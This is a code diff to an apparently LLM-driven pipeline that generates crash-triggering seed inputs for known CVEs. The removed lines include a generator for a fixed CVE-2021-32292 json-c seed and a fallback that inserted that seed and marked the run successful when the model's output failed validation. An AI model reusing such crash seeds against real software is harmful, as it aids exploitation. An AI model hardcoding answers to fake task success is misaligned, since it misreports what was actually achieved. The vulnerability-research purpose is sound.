@@ -746,52 +746,6 @@ def _extract_mutations_from_generation(generation: Any) -> tuple[list[Any], str]
     return [], "none"
 
 
-def _normalize_mutation_aliases(mutations: Any) -> tuple[list[Any], int]:
-    """
-    Normalize common op-name aliases produced by some models.
-    """
-    if not isinstance(mutations, list):
-        return [], 0
-
-    alias_map = {
-        "insert_repeated_byte": "insert_repeated_bytes",
-        "append_byte": "append_bytes",
-    }
-    normalized: list[Any] = []
-    changes = 0
-    for mut in mutations:
-        if isinstance(mut, dict):
-            op = mut.get("op")
-            if isinstance(op, str):
-                canon = alias_map.get(op.strip())
-                if canon:
-                    patched = dict(mut)
-                    patched["op"] = canon
-                    normalized.append(patched)
-                    changes += 1
-                    continue
-        normalized.append(mut)
-    return normalized, changes
-
-
-def _build_jsonc_boundary_fallback_seed(level: str) -> bytes:
-    """
-    Deterministic fallback envelope for CVE-2021-32292 campaigns.
-    Ensures:
-    - seed length >= 32768
-    - first NUL byte at offset 32767
-    - open-prefix preserved for L0/L1 methodology
-    """
-    _ = level  # level kept for future level-specific variants.
-    prefix = b'{"a":"'
-    pre_nul_target = 32767
-    if len(prefix) > pre_nul_target:
-        prefix = prefix[:pre_nul_target]
-    pad_len = pre_nul_target - len(prefix)
-    # Keep deterministic tail to avoid accidental truncation at exact boundary.
-    return prefix + (b"A" * pad_len) + b"\x00" + b"BBBB"
-
-
 def validate_text_seed_structure(seed_bytes: bytes) -> tuple[bool, str]:
     """
     Validate text-like seeds used as CLI arguments.
@@ -1605,16 +1559,6 @@ def run_pipeline(
                     "- Avoid large exploratory plans or prose outside strict JSON schema.\n"
                     "- Keep edits near SWF block/tag boundaries and preserve basic SWF parseability.\n"
                 )
-            elif task_id == "CVE-2021-32292_jsonc":
-                generate_prompt += (
-                    "\n\nTASK-LOCAL RULES (CVE-2021-32292_jsonc):\n"
-                    "- Return ONLY one compact JSON object with keys `mutations` and `rationale`.\n"
-                    "- `mutations` must contain 1-2 operations only.\n"
-                    "- Allowed ops for this task: overwrite_range, pad_file, append_bytes,\n"
-                    "  truncate, repeat_range, insert_repeated_bytes.\n"
-                    "- Do NOT output helper keys (functions/plan), markdown, or prose.\n"
-                    "- Keep rationale under 180 chars.\n"
-                )
             elif task_id == "CVE-2022-24724_cmark-gfm":
                 # Detect repeated no-progress signal (both builds exit cleanly)
                 # and explicitly steer the model toward boundary-crossing table
@@ -1682,9 +1626,6 @@ def run_pipeline(
             
             # Handle object/array responses and common schema aliases.
             mutations, extraction_source = _extract_mutations_from_generation(generation)
-            mutations, alias_changes = _normalize_mutation_aliases(mutations)
-            if alias_changes:
-                print(f"  Warning: normalized {alias_changes} mutation op alias(es)")
             if extraction_source == "array":
                 print("  Warning: LLM returned array instead of object, using as mutations")
             elif extraction_source not in {"mutations", "none"}:
@@ -1753,35 +1694,6 @@ def run_pipeline(
 
             task_guard_ok, task_guard_error = _task_specific_seed_guard(task_id, level, new_seed, seed_extension)
             if not task_guard_ok:
-                if task_id == "CVE-2021-32292_jsonc":
-                    # Stabilization fallback for boundary-driven json-c campaign:
-                    # if model output drifts (short seed, wrong NUL placement),
-                    # coerce to deterministic valid envelope and continue.
-                    fb_seed = _build_jsonc_boundary_fallback_seed(level)
-                    fb_ok, fb_err = _task_specific_seed_guard(task_id, level, fb_seed, seed_extension)
-                    if fb_ok:
-                        print(
-                            "  ⚠ Task guard failed; applying deterministic "
-                            "jsonc boundary fallback"
-                        )
-                        new_seed = fb_seed
-                        print(
-                            "  ✓ Fallback seed ready: "
-                            f"{len(new_seed)} bytes, first NUL at offset 32767"
-                        )
-                        try:
-                            if isinstance(generation, dict):
-                                generation["fallback_applied"] = "jsonc_boundary_envelope"
-                        except Exception:
-                            pass
-                        mutation_success = True
-                        break
-                    # If fallback somehow fails, keep original error for visibility.
-                    task_guard_error = (
-                        f"{task_guard_error}; fallback-failed: {fb_err}"
-                        if fb_err
-                        else task_guard_error
-                    )
                 mutation_error = task_guard_error
                 failed_attempts.append({
                     "attempt": attempt,
